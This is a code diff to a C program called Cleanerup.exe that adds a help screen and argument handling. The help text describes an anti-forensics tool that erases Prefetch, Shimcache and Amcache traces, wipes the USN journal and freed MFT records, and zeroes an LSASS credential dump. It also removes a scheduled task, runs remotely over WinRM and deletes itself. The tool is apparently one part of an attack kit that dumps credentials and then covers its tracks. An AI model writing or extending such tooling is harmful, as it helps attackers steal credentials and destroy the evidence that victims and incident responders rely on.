@@ -185,7 +185,34 @@ void RemoveAmcacheEntries(const char* names[], int count) {
 }
 
 
-int main() {
+void PrintUsage() {
+    printf(
+        "Cleanerup.exe - Remote forensic artifact cleanup\n\n"
+        "Usage:\n"
+        "  Cleanerup.exe           Run cleanup (no arguments required)\n"
+        "  Cleanerup.exe --help    Show this help\n\n"
+        "What it cleans:\n"
+        "  - Prefetch files        (BusinessAnalyzer, LsassSilentProcessExit, Cleanerup)\n"
+        "  - Shimcache entries     (AppCompatCache registry blob, Win10/11)\n"
+        "  - Amcache entries       (Amcache.hve hive)\n"
+        "  - USN Journal           (deleted and recreated)\n"
+        "  - Freed MFT records     (100-file displacement)\n"
+        "  - Scheduled task file   (C:\\Windows\\System32\\Tasks\\mindFlush, zeroed)\n"
+        "  - Scheduled task        (mindFlush)\n"
+        "  - Dump file             (path read from C:\\tempodempo\\tempo.txt, zeroed)\n"
+        "  - C:\\tempodempo\\        (all files zeroed before deletion)\n\n"
+        "Note:\n"
+        "  Requires admin privileges. Intended to be deployed and triggered\n"
+        "  remotely by winRlZZaZ via WinRM. Self-deletes on exit.\n"
+    );
+}
+
+
+int main(int argc, char* argv[]) {
+    if (argc > 1) {
+        PrintUsage();
+        return 0;
+    }
     ClearUsnJournal();
 
     const char* prefetchNames[] = { BIN_BUSINESSANALYZER, BIN_LSASS_DUMPER, BIN_SELF };
